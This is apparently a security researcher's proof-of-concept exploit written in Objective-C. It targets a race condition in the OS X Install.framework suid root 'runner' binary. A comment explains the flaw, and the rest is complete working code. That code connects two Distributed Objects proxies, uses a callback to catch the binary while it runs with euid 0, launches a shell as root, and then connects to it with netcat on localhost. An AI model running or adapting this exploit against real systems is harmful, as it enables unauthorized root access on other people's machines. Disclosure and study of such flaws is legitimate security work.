/*
  OS X Install.framework suid root runner binary priv-esc due to not accounting for implicitly parallel nature of Distributed Objects
  ianbeer

  The Install.framework runner suid root binary does not correctly account for the fact that Distributed Objects
  can be connected to by multiple clients at the same time.

  By connecting two proxy objects to an IFInstallRunner and calling [IFInstallRunner makeReceiptDirAt:asRoot:]
  in the first and passing a custom object as the directory name we can get a callback to our code just after the
  makeReceiptDirAt code has called seteuid(0);setguid(0) to regain privs. Since BSD priviledges are per-process
  this means that our other proxy object will now have euid 0 without having to provide an authorization reference.

  In this second proxy we can then just call runTaskSecurely and get a root shell before returning from the first proxy's callback function
  which will then drop privs.

  build using the provided makefile and run passing the full path to the localhost shell

*/

#import <objc/Object.h>
#import <Foundation/Foundation.h>

#import <stdio.h>
#import <string.h>
#import <time.h>
#import <unistd.h>


char* non_existant_file = "/this/file/does/not/exist";

const char* vended_server = "exploit_callback_server";
const char* suid_binary_path = "/System/Library/PrivateFrameworks/Install.framework/Resources/runner";

const char* localhost_shell_path = NULL;

NSString* runnerConnectionName;

id first_proxy;
id second_proxy;

@interface InitialPathObject : NSObject
{
  int count;
}

- (id) stringByAppendingPathComponent: (NSString*) aString;
- (void) do_shell;
- (id) init;
@end

@implementation InitialPathObject

- (id)init {
  self = [super init];
  if (self) {
    count = 0;
  }
  return self;
}

- (id) stringByAppendingPathComponent: (NSString*) aString;
{
  NSLog(@"called stringByAppendingPathComponent");
  NSLog(aString);
  if (count == 0) {
    count = 1;
    NSLog(@"first time: returning a path to a non-existant file");
    return @(non_existant_file);
  }

  NSLog(@"second time");
  
  
  NSTask* t = [NSTask alloc];
  [t init];

  [t setLaunchPath:@(localhost_shell_path)];
  [t setArguments: [NSArray arrayWithObjects: @"ignored", nil]];
  [t setEnvironment: [NSDictionary dictionaryWithObjectsAndKeys: @"foo", @"bar", nil]];
  [t setCurrentDirectoryPath: @"/"];

  NSLog(@"running localhost_shell as root...");
  [second_proxy runTaskSecurely:t withKey:0 onPort:@"something"];
  NSLog(@"wait a sec for shell...");
  [self performSelector:@selector(do_shell) withObject:nil afterDelay:1];

  return @"hello";
}

- (void) do_shell;
{
  NSLog(@"got root? should be connected to a localhost bind shell:");
  system("nc localhost 54321");
  NSLog(@"Control-C to quit..");
}

@end


@interface FakeVendor : NSObject
- (oneway void) setRunnerPid: (int) pid;
- (oneway void) setRunnerConnectionName: (NSString*) name;
- (void) fork_exec_suid;
- (void) part_2;

@end

@implementation FakeVendor

- (oneway void) setRunnerPid: (int) pid;
{
  NSLog(@"called setRunnerPid");
  printf("the suid runner's pid is %d\n", pid);
}

- (oneway void) setRunnerConnectionName: (NSString*) name;
{
  NSLog(@"got the IFInstallRunner Distributed Object name:");
  NSLog(name);
  [name retain];
  runnerConnectionName = name;
  [self performSelector:@selector(part_2) withObject:nil afterDelay:0];
}

- (void) fork_exec_suid;
{
  NSLog(@"forking and execing suid child...");
  int fds[2];
  pipe(fds);

  int read_end = fds[0];
  int write_end = fds[1];

  pid_t p = fork();
  if (p == -1) {
    NSLog(@"fork failed?");
    exit(EXIT_FAILURE);
  }
  if (p == 0) {
    // child
    // close the write end of the pipe
    close(write_end);

    // dup2 the read end of the pipe to stdin
    dup2(read_end, STDIN_FILENO);
    
    // execve the suid binary:
    char* argv[] = {suid_binary_path, NULL};
    char* envp[] = {NULL};
    execve(suid_binary_path, argv, envp);
  } else {
    // parent
    // close the read end of the pipe
    close(read_end);
    
    // write the vender_server name to stdin of the suid_binary:
    write(write_end, vended_server, strlen(vended_server));
    write(write_end, "\n", 1);
    NSLog(@"wrote server name to suid stdin");
  }
}

- (void) part_2;
{
  NSLog(@"connecting proxy object to IFInstallRunner...");
  first_proxy = [[NSConnection
      rootProxyForConnectionWithRegisteredName:runnerConnectionName
      host:nil] retain];
  
  second_proxy = [[NSConnection
      rootProxyForConnectionWithRegisteredName:runnerConnectionName
      host:nil] retain];

  // set the baton path in the second proxy:
  [second_proxy setBatonPath:@(localhost_shell_path)]; 

  InitialPathObject* ipo = [[InitialPathObject alloc] init];
  [ipo retain];
  [first_proxy makeReceiptDirAt:ipo asRoot:1];

  NSLog(@"sent makeReceiptDirAt message...");

}

@end


int main (int argc, char** argv) {
  if (argc < 2) {
    printf("need a path to a localhost shell please :)\n");
    exit(EXIT_SUCCESS);
  }
  localhost_shell_path = argv[1];

  FakeVendor* serverObject = [FakeVendor alloc];
  [serverObject init];

  NSConnection *theConnection;
  
  // register our callback object for the SUID root binary to connect to  
  theConnection = [NSConnection defaultConnection];
  [theConnection retain];
  
  [theConnection setRootObject:serverObject];
  if ([theConnection registerName:@(vended_server)] == NO) {
    NSLog(@"couldn't register object name");
  }

  NSLog(@"starting run loop");

  [serverObject performSelector:@selector(fork_exec_suid) withObject:nil afterDelay:0];

  [[NSRunLoop currentRunLoop] run];

  return 0;
}
